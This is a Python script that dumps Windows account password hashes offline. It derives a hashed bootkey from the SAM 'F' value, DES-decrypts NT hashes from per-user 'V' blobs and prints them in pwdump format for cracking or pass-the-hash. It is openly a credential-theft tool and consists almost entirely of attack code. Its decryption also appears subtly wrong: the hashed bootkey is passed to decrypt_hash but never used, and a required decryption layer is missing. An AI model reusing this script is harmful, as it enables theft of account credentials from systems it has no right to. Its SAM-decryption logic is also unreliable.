#!/usr/bin/env python3
from Crypto.Cipher import ARC4, DES
from Crypto.Hash import MD5
import struct

# Load bootkey
bootkey = open('bootkey.bin', 'rb').read()
print(f"[*] Bootkey: {bootkey.hex()}")

# Load F value
f_data = open('F.bin', 'rb').read()

# Decrypt hbootkey from F value
enc_hbootkey = f_data[0x70:0x80]
rc4_key = MD5.new(bootkey + b'!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0').digest()
cipher = ARC4.new(rc4_key)
hbootkey = cipher.decrypt(enc_hbootkey)
print(f"[*] Hashed bootkey: {hbootkey.hex()}")

# Function to decrypt hash
def str_to_key(s):
    key = []
    key.append(s[0] >> 1)
    key.append(((s[0] & 0x01) << 6) | (s[1] >> 2))
    key.append(((s[1] & 0x03) << 5) | (s[2] >> 3))
    key.append(((s[2] & 0x07) << 4) | (s[3] >> 4))
    key.append(((s[3] & 0x0F) << 3) | (s[4] >> 5))
    key.append(((s[4] & 0x1F) << 2) | (s[5] >> 6))
    key.append(((s[5] & 0x3F) << 1) | (s[6] >> 7))
    key.append(s[6] & 0x7F)
    for i in range(8):
        key[i] = (key[i] << 1) & 0xfe
    return bytes(key)

def decrypt_hash(enc_hash, rid, hbootkey):
    des_key1 = str_to_key(struct.pack('<I', rid) + b'\0\0\0')
    des_key2 = str_to_key(struct.pack('<I', rid)[1:] + b'\0\0\0\0')
    
    cipher1 = DES.new(des_key1, DES.MODE_ECB)
    cipher2 = DES.new(des_key2, DES.MODE_ECB)
    
    dec1 = cipher1.decrypt(enc_hash[:8])
    dec2 = cipher2.decrypt(enc_hash[8:16])
    
    return dec1 + dec2

# Parse V files
import glob
for v_file in sorted(glob.glob('V_*.bin')):
    rid = int(v_file.split('_')[1].split('.')[0], 16)
    v_data = open(v_file, 'rb').read()
    
    # Parse V structure
    name_offset = struct.unpack('<I', v_data[0x0C:0x10])[0] + 0xCC
    name_length = struct.unpack('<I', v_data[0x10:0x14])[0]
    nt_offset = struct.unpack('<I', v_data[0x9C:0xA0])[0] + 0xCC
    nt_length = struct.unpack('<I', v_data[0xA0:0xA4])[0]
    
    # Extract username
    if name_offset + name_length <= len(v_data):
        username = v_data[name_offset:name_offset+name_length].decode('utf-16-le', errors='ignore')
    else:
        username = f"User_{rid}"
    
    # Extract and decrypt NT hash
    if nt_length >= 20 and nt_offset + nt_length <= len(v_data):
        enc_nt = v_data[nt_offset+4:nt_offset+20]  # Skip 4 byte header
        nt_hash = decrypt_hash(enc_nt, rid, hbootkey)
        print(f"{username}:{rid}:aad3b435b51404eeaad3b435b51404ee:{nt_hash.hex()}:::")
